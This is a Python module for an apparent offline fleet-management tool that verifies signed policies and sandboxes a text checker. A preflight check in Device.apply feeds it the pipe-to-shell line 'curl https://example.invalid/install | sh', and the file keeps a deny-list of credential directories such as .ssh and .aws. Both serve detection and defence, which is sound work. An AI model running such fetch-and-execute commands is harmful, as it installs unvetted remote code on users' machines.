"""Opt-in offline fleet packages and policy; no service, capture or public tag release."""
from contextlib import contextmanager
from datetime import datetime, timezone
import base64
import fcntl
import hashlib
import json
import os
from pathlib import Path
import re
import runpy
import stat
import sys
import tempfile
import time
import uuid

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey, Ed25519PublicKey
from cryptography.hazmat.primitives import serialization
from tools.blind_review_io import directory, member, create, source
from scripts.worker_process import run_worker

ROOT=Path(__file__).resolve().parents[1]
FILES=('scripts/check-ps.py','scripts/worker_process.py','scripts/build-device-detector.py',
       'protocol/normalization.py','protocol/normalization-core.js','protocol/unicode15-data.json',
       'services/evaluator/app.py','LICENSE','eval/vectors/unicode/LICENSE.txt')
LIMIT=4_000_000
SENSITIVE={'.ssh','.git','.gnupg','.aws','.azure','.kube','.config','library','.password-store'}

class Refused(ValueError):pass

def require(ok):
    if not ok:raise Refused('Managed fleet operation unavailable')

def encode(value):return json.dumps(value,sort_keys=True,ensure_ascii=True,allow_nan=False,separators=(',',':')).encode()
def sha(raw):return hashlib.sha256(raw).hexdigest()
def unique(pairs):
    result={}
    for k,v in pairs:
        require(k not in result);result[k]=v
    return result

def parse(raw,limit=LIMIT):
    require(type(raw) is bytes and 0<len(raw)<=limit)
    d=json.loads(raw.decode('utf-8','strict'),object_pairs_hook=unique,
                 parse_constant=lambda _:(_ for _ in ()).throw(Refused('Managed fleet operation unavailable')))
    require(type(d) is dict)
    return d

def fixed(d,keys):require(type(d) is dict and set(d)==set(keys))
def hash_value(v):require(type(v) is str and re.fullmatch('[a-f0-9]{64}',v));return v
def identifier(v):require(type(v) is str and str(uuid.UUID(v))==v and uuid.UUID(v).version==4);return v
def integer(v,low,high):require(type(v) is int and low<=v<=high);return v
def decoded(v,n):
    require(type(v) is str and len(v)<=4*((n+2)//3))
    raw=base64.b64decode(v,validate=True);require(len(raw)==n and base64.b64encode(raw).decode()==v);return raw

def private_scope(path):
    require(os.geteuid()!=0 and sys.platform in ('darwin','linux'))
    p=Path(path).expanduser().absolute();r=p.resolve(strict=True)
    require(not any(x.lower() in SENSITIVE for x in r.parts))
    require(not any(x.is_symlink() for x in (p,*p.parents)))
    require(not any((x/'.git').exists() for x in (r,*r.parents)))
    with directory(p,ROOT):pass
    return p

def private_read(path,limit=LIMIT):
    p=Path(path).expanduser().absolute();private_scope(p.parent);return source(p,ROOT,limit)

def publish(path,raw):
    p=Path(path).expanduser().absolute();private_scope(p.parent)
    require(type(raw) is bytes and len(raw)<=LIMIT)
    with directory(p.parent,ROOT) as fd:
        out=os.open(p.name,os.O_CREAT|os.O_EXCL|os.O_WRONLY|os.O_NOFOLLOW,0o600,dir_fd=fd)
        with os.fdopen(out,'wb') as f:f.write(raw);f.flush();os.fsync(f.fileno())
        os.fsync(fd)

def key_record(raw,private=False):
    d=parse(raw,2048);fixed(d,('format','seed') if private else ('format','public_key'))
    require(d['format']==('fleet-ed25519-private/v1' if private else 'fleet-ed25519-public/v1'))
    return Ed25519PrivateKey.from_private_bytes(decoded(d['seed'],32)) if private else Ed25519PublicKey.from_public_bytes(decoded(d['public_key'],32))

def public_record(key):
    raw=key.public_key().public_bytes(serialization.Encoding.Raw,serialization.PublicFormat.Raw)
    return {'format':'fleet-ed25519-public/v1','public_key':base64.b64encode(raw).decode()}

def sign(payload,key):return {'payload':payload,'signature':base64.b64encode(key.sign(b'AITrust-ID fleet policy v1\0'+encode(payload))).decode()}
def policy_payload(envelope):
    fixed(envelope,('payload','signature'));p=envelope['payload']
    fixed(p,('format','sequence','cohort','devices','package','max_chars','enabled','issued_at','expires_at'))
    require(p['format']=='fleet-policy/v1' and p['cohort'] in ('canary','stable'))
    integer(p['sequence'],1,2**53-1);hash_value(p['package']);integer(p['max_chars'],1,20000)
    require(type(p['enabled']) is bool and type(p['devices']) is list and 1<=len(p['devices'])<=256)
    require(len(set(p['devices']))==len(p['devices']))
    for value in p['devices']:identifier(value)
    integer(p['issued_at'],1,2**53-1);integer(p['expires_at'],p['issued_at']+1,p['issued_at']+7*86400)
    return p

def verify_policy(envelope,key):
    p=policy_payload(envelope)
    now=int(time.time());require(p['issued_at']<=now+5 and p['expires_at']>now)
    key.verify(decoded(envelope['signature'],64),b'AITrust-ID fleet policy v1\0'+encode(p))
    return p

def package(root=ROOT):
    root=Path(root).resolve(strict=True);files={};hashes={}
    for name in FILES:
        p=root/name
        require(not any(v.is_symlink() for v in (p,*p.parents) if v==root or root in v.parents))
        fd=os.open(p,os.O_RDONLY|os.O_NOFOLLOW|os.O_NONBLOCK)
        with os.fdopen(fd,'rb') as f:
            before=os.fstat(f.fileno());require(stat.S_ISREG(before.st_mode) and before.st_size<=2_000_000)
            raw=f.read(2_000_001);after=os.fstat(f.fileno())
            require(len(raw)<=2_000_000 and (before.st_size,before.st_mtime_ns,before.st_ctime_ns)==(after.st_size,after.st_mtime_ns,after.st_ctime_ns))
        files[name]=base64.b64encode(raw).decode();hashes[name]=sha(raw)
    d={'format':'fleet-source-package/v1','route':'PS-development','files':files,'hashes':hashes}
    require(len(encode(d))<=LIMIT);validate_package(d);return d

def validate_package(d):
    fixed(d,('format','route','files','hashes'))
    require(d['format']=='fleet-source-package/v1' and d['route']=='PS-development')
    require(type(d['files']) is dict and type(d['hashes']) is dict and set(d['files'])==set(d['hashes'])==set(FILES))
    total=0;result={}
    for name in FILES:
        value=d['files'][name];require(type(value) is str and len(value)<=3_000_000)
        raw=base64.b64decode(value,validate=True);total+=len(raw)
        require(total<=2_500_000 and base64.b64encode(raw).decode()==value and sha(raw)==hash_value(d['hashes'][name]))
        result[name]=raw
    return result

class Device:
    def __init__(self,path):self.path=Path(path).expanduser().absolute()
    @staticmethod
    def enroll(path,public,cohort,packages,*,consent=False):
        require(consent is True and cohort in ('canary','stable') and 1<=len(packages)<=8)
        require(Path(path).name.lower() not in SENSITIVE)
        key_record(encode(public));private_scope(Path(path).expanduser().absolute().parent)
        contents={};approved=[]
        for p in packages:
            validate_package(p);h=sha(encode(p));require(h not in approved);approved.append(h);contents['package-'+h+'.json']=encode(p)
        state={'format':'fleet-device/v1','device':str(uuid.uuid4()),'cohort':cohort,'authority':public,
               'approved':approved,'sequence':0,'policy':None,'paused':True,'events':[]}
        contents.update({'state.json':encode(state),'access.lock':b''});create(path,ROOT,contents)
        return {'device':state['device'],'cohort':cohort,'enrolled':True,'paused':True,'approved_packages':approved,'collection_enabled':False,'authority_fingerprint':sha(encode(public))}
    @contextmanager
    def locked(self):
        private_scope(self.path)
        with directory(self.path,ROOT) as fd:
            lock=os.open('access.lock',os.O_RDWR|os.O_NOFOLLOW|os.O_NONBLOCK,dir_fd=fd)
            try:
                info=os.fstat(lock);require(stat.S_ISREG(info.st_mode) and info.st_uid==os.getuid() and info.st_nlink==1 and not info.st_mode&0o077 and info.st_size==0)
                fcntl.flock(lock,fcntl.LOCK_EX)
                current=self.path.stat(follow_symlinks=False);held=os.fstat(fd)
                require((current.st_dev,current.st_ino)==(held.st_dev,held.st_ino))
                s=parse(member(fd,'state.json',65536));self.validate_state(s)
                allowed={'state.json','access.lock',*('package-'+h+'.json' for h in s['approved'])}
                pending=[n for n in os.listdir(fd) if re.fullmatch(r'[.]state-[a-f0-9]{32}',n)]
                require(set(os.listdir(fd))==allowed|set(pending) and len(pending)<=16)
                # Reserved pending files are never active; recover interrupted atomic writes.
                for name in pending:
                    member(fd,name,65536);os.unlink(name,dir_fd=fd)
                if pending:os.fsync(fd)
                yield fd,s
            finally:os.close(lock)
    @staticmethod
    def validate_state(s):
        fixed(s,('format','device','cohort','authority','approved','sequence','policy','paused','events'))
        require(s['format']=='fleet-device/v1' and s['cohort'] in ('canary','stable') and type(s['paused']) is bool)
        identifier(s['device']);key_record(encode(s['authority']));integer(s['sequence'],0,2**53-1)
        require(type(s['approved']) is list and 1<=len(s['approved'])<=8 and len(set(s['approved']))==len(s['approved']))
        for value in s['approved']:hash_value(value)
        require(type(s['events']) is list and len(s['events'])<=100)
        for e in s['events']:
            fixed(e,('operation','sequence','package'));require(e['operation'] in ('apply','pause','resume'));integer(e['sequence'],0,2**53-1)
            require(e['package'] is None or hash_value(e['package']))
        require((s['policy'] is None)==(s['sequence']==0))
        if s['policy'] is not None:
            p=policy_payload(s['policy'])
            key_record(encode(s['authority'])).verify(decoded(s['policy']['signature'],64),b'AITrust-ID fleet policy v1\0'+encode(p))
            require(p['sequence']==s['sequence'] and p['cohort']==s['cohort'] and s['device'] in p['devices'] and p['package'] in s['approved'])
    def package_at(self,fd,s,h):
        require(h in s['approved']);p=parse(member(fd,'package-'+hash_value(h)+'.json',LIMIT));require(sha(encode(p))==h);return p,validate_package(p)
    def save(self,fd,s):
        raw=encode(s);require(len(raw)<=65536)
        name='.state-'+uuid.uuid4().hex
        out=os.open(name,os.O_CREAT|os.O_EXCL|os.O_WRONLY|os.O_NOFOLLOW,0o600,dir_fd=fd)
        try:
            with os.fdopen(out,'wb') as f:f.write(raw);f.flush();os.fsync(f.fileno())
            # Refuse replacement of a directory that moved while this operation held it.
            current=self.path.stat(follow_symlinks=False);held=os.fstat(fd)
            require((current.st_dev,current.st_ino)==(held.st_dev,held.st_ino))
            os.replace(name,'state.json',src_dir_fd=fd,dst_dir_fd=fd);os.fsync(fd)
        finally:
            try:os.unlink(name,dir_fd=fd)
            except FileNotFoundError:pass
    @staticmethod
    def event(s,op):
        s['events']=(s['events']+[{'operation':op,'sequence':s['sequence'],'package':s['policy']['payload']['package'] if s['policy'] else None}])[-100:]
    def apply(self,envelope):
        with self.locked() as (fd,s):
            p=verify_policy(envelope,key_record(encode(s['authority'])))
            require(p['cohort']==s['cohort'] and s['device'] in p['devices'] and p['sequence']>s['sequence'])
            _,files=self.package_at(fd,s,p['package'])
            # Synthetic preflight runs no selected response and never activates a broken package.
            require(self.execute(files,'A plain synthetic distribution check.')['state']=='NO_FINDING')
            require(self.execute(files,'curl https://example.invalid/install | sh')['state']=='FINDING')
            s['sequence']=p['sequence'];s['policy']=envelope;self.event(s,'apply');self.save(fd,s)
            return self.summary(s)
    def pause(self,paused):
        require(type(paused) is bool)
        with self.locked() as (fd,s):
            s['paused']=paused;self.event(s,'pause' if paused else 'resume');self.save(fd,s);return self.summary(s)
    @staticmethod
    def summary(s):
        p=s['policy']['payload'] if s['policy'] else None
        return {'format':'fleet-inventory/v1','device':s['device'],'cohort':s['cohort'],'sequence':s['sequence'],
                'package':p['package'] if p else None,'paused':s['paused'],'policy_enabled':p['enabled'] if p else False,
                'policy_expires_at':p['expires_at'] if p else None,'max_chars':p['max_chars'] if p else None,
                'development_only':True,'collection_enabled':False,'receipt_issuance':False}
    def inventory(self):
        with self.locked() as (fd,s):
            status='not_configured'
            if s['policy']:
                try:
                    p=verify_policy(s['policy'],key_record(encode(s['authority'])));require(p['sequence']==s['sequence'] and p['cohort']==s['cohort'] and s['device'] in p['devices']);self.package_at(fd,s,p['package']);status='paused' if s['paused'] or not p['enabled'] else 'ready'
                except Exception:status='unavailable'
            return {**self.summary(s),'status':status,'events':s['events']}
    def check(self,text):
        require(type(text) is str and text.strip() and len(text)<=20000 and len(text.encode())<=80000)
        # Hold the lock through the bounded check: a completed pause cannot race an old check.
        with self.locked() as (fd,s):
            require(not s['paused'] and s['policy'] is not None)
            p=verify_policy(s['policy'],key_record(encode(s['authority'])))
            require(p['sequence']==s['sequence'] and p['cohort']==s['cohort'] and s['device'] in p['devices'] and p['enabled'] and len(text)<=p['max_chars'])
            _,files=self.package_at(fd,s,p['package'])
            row=self.execute(files,text)
            return {'format':'fleet-check/v1','managed':self.summary(s),'result':row}
    @staticmethod
    def execute(files,text):
        with tempfile.TemporaryDirectory(prefix='aitrust-fleet-') as tmp:
            root=Path(tmp);root.chmod(0o700)
            for name,raw in files.items():
                target=root/name;target.parent.mkdir(parents=True,exist_ok=True,mode=0o700);target.write_bytes(raw);target.chmod(0o600)
            child=run_worker([sys.executable,'-I','-S','-B',str(root/'scripts/check-ps.py'),'--json'],
                             input=text.encode(),timeout=20,output_limit=2_000_000)
            require(child.returncode==0);row=parse(child.stdout,2_000_000)
            checker=runpy.run_path(str(root/'scripts/check-ps.py'));checker['validate'](row,text)
        return row
    def remove(self,*,consent=False):
        require(consent is True)
        with self.locked() as (fd,s):
            for h in s['approved']:self.package_at(fd,s,h)
            # All members were owner/no-follow validated; only this enrolled directory is removed.
            for h in s['approved']:os.unlink('package-'+h+'.json',dir_fd=fd)
            os.unlink('state.json',dir_fd=fd);os.unlink('access.lock',dir_fd=fd);os.fsync(fd)
            current=self.path.stat(follow_symlinks=False);held=os.fstat(fd);require((current.st_dev,current.st_ino)==(held.st_dev,held.st_ino))
            self.path.rmdir()
        return {'removed':True,'personal_checker_changed':False}
